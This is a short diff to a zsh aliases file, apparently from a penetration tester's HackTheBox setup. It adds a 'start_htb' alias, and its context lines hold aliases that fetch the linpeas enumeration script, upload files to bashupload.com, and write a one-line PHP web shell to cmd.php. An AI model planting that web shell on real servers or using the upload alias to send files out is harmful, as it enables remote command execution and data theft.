@@ -199,6 +199,7 @@ addhost() {
 
 
 # Other stuff
+alias start_htb="python3 ~/zsh-aliases/start_htb.py"
 alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
 alias upload='curl bashupload.com -T "${@}"'
 alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
